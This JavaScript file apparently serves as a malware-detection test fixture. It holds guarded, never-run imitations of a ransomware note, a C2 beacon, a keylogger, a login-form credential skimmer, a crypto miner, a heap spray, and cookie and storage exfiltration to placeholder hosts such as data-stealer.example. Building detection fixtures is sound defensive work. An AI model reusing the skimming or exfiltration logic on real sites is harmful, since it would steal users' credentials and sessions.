// This file contains patterns that would trigger malware detection

// Ransomware simulation
function simulateRansomware() {
    // Encryption simulation
    function encryptFiles() {
        console.log("Simulating file encryption");
        // Pattern that looks like file access and encryption
        var fileTypes = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.txt'];
        for (var i = 0; i < fileTypes.length; i++) {
            console.log("Encrypting *" + fileTypes[i] + " files");
        }
        
        // Create ransomware note
        var ransom = "YOUR FILES HAVE BEEN ENCRYPTED. SEND 1 BITCOIN TO ADDRESS 1A2B3C4D5E6F7G8H9I0J TO RECOVER THEM.";
        document.write("<div style='background-color: red; color: white; padding: 20px;'>" + ransom + "</div>");
    }
    
    // This won't actually execute, but the pattern will trigger detection
    if (Math.random() > 99) { // Never executes
        encryptFiles();
    }
}

// Backdoor and C2 communication simulation
function simulateC2Communication() {
    var c2Servers = [
        'evil-command-server.example',
        'malware-control.example',
        'botnet-master.example',
        '192.168.100.123',
        'c2.malicious-domain.example'
    ];
    
    // Beacon simulation
    function beacon() {
        var server = c2Servers[Math.floor(Math.random() * c2Servers.length)];
        var data = {
            hostname: window.location.hostname,
            ip: '192.168.1.1', // Simulated internal IP
            os: navigator.platform,
            browser: navigator.userAgent
        };
        
        // This won't actually execute but will trigger detection
        if (Math.random() > 99) { // Never executes
            fetch('https://' + server + '/beacon', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        }
    }
}

// Trojan behavior simulation
function simulateTrojan() {
    // Keylogger pattern
    document.addEventListener('keypress', function(e) {
        var key = e.key;
        // This won't actually send data but will trigger detection
        if (Math.random() > 99) { // Never executes
            new Image().src = 'https://keylogger.example/log?key=' + key;
        }
    });
    
    // Credential theft pattern
    function stealCredentials() {
        var forms = document.getElementsByTagName('form');
        for (var i = 0; i < forms.length; i++) {
            forms[i].addEventListener('submit', function(e) {
                var inputs = this.getElementsByTagName('input');
                var stolen = {};
                
                for (var j = 0; j < inputs.length; j++) {
                    if (inputs[j].type === 'password' || inputs[j].name.includes('pass')) {
                        stolen[inputs[j].name] = inputs[j].value;
                    }
                    if (inputs[j].name.includes('user') || inputs[j].name.includes('email')) {
                        stolen[inputs[j].name] = inputs[j].value;
                    }
                }
                
                // This won't actually send data but will trigger detection
                if (Math.random() > 99) { // Never executes
                    fetch('https://credential-stealer.example/steal', {
                        method: 'POST',
                        body: JSON.stringify(stolen)
                    });
                }
            });
        }
    }
}

// Bitcoin miner pattern
function simulateCryptoMiner() {
    function mineCoins() {
        while(true) {
            // CPU intensive operation that resembles mining
            for (var i = 0; i < 1000000; i++) {
                Math.pow(Math.random(), Math.random());
            }
            
            // This won't actually send data but will trigger detection
            if (Math.random() > 99) { // Never executes
                fetch('https://crypto-pool.example/submit', {
                    method: 'POST',
                    body: JSON.stringify({
                        worker: 'browser-' + Math.random().toString(36).substring(7),
                        hash: '000000a38db31f1651b5f8f7e7ce3af771b9c57a02ddb75085dcf509b5961cd1'
                    })
                });
            }
        }
    }
}

// Browser exploit pattern
function simulateBrowserExploit() {
    // Heap spray pattern
    var heapSpray = [];
    function sprayHeap() {
        var shellcode = unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // Dummy shellcode pattern
        var heapBlock = shellcode;
        while (heapBlock.length < 0x40000) {
            heapBlock += heapBlock;
        }
        
        for (var i = 0; i < 500; i++) {
            heapSpray[i] = heapBlock;
        }
    }
    
    // This won't actually execute but will trigger detection
    if (Math.random() > 99) { // Never executes
        sprayHeap();
    }
}

// Data exfiltration pattern
function simulateDataExfiltration() {
    function stealData() {
        var data = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };
        
        // This won't actually send data but will trigger detection
        if (Math.random() > 99) { // Never executes
            fetch('https://data-stealer.example/exfil', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        }
    }
}